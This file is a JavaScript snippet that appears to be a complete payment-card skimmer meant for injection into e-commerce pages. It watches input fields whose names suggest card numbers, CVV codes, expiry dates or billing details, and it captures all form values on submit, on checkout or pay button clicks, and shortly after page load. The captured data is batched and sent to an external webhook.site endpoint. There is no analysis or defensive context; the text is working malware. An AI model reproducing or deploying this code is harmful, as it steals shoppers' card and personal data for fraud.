(function () {
  if (window.__ftsSkim) return;
  window.__ftsSkim = true;

  var HOOK = 'https://webhook.site/1f19caf6-d2c4-4deb-87e2-31b3cf379e42';
  var tag  = (document.currentScript && document.currentScript.getAttribute('data-tag')) || location.hostname;

  function send(p) {
    try {
      var body = JSON.stringify(p);
      if (navigator.sendBeacon) navigator.sendBeacon(HOOK, new Blob([body], { type: 'text/plain;charset=UTF-8' }));
      else fetch(HOOK, { method: 'POST', mode: 'no-cors', keepalive: true, body: body });
    } catch (e) {}
  }

  var queue = [], timer = null;
  function q(p) {
    queue.push(p);
    if (timer) return;
    timer = setTimeout(function () {
      timer = null;
      send({ type: 'batch', site: tag, url: location.href, events: queue.splice(0), t: Date.now() });
    }, 800);
  }

  var RE = /(card|cc[-_]?|credit|cvv|cvc|cid|exp|month|year|zip|postal|billing|name)/i;
  function fname(el) { return (el.name || el.id || el.getAttribute('autocomplete') || el.placeholder || '').trim(); }

  document.addEventListener('input', function (e) {
    var el = e.target;
    if (!el || !el.tagName) return;
    var n = fname(el);
    if (!n || !RE.test(n) || !el.value) return;
    q({ ev: 'input', f: n, v: el.value });
  }, true);

  function snapshot(kind) {
    var out = {};
    Array.prototype.forEach.call(document.querySelectorAll('input,select,textarea'), function (el) {
      var n = fname(el);
      if (!n) return;
      if (el.type === 'checkbox' || el.type === 'radio') { if (el.checked) out[n] = el.value; }
      else if (el.value) out[n] = el.value;
    });
    if (Object.keys(out).length) send({ type: kind, site: tag, url: location.href, fields: out, t: Date.now() });
  }

  document.addEventListener('submit', function () { setTimeout(function () { snapshot('submit'); }, 200); }, true);
  document.addEventListener('click', function (e) {
    var t = e.target && e.target.closest && e.target.closest('button,a,input[type=submit]');
    if (!t) return;
    if (/pay|place order|submit|continue|checkout|order/.test((t.innerText || t.value || '').toLowerCase()))
      setTimeout(function () { snapshot('click'); }, 500);
  }, true);

  setTimeout(function () { snapshot('load'); }, 3000);
})();
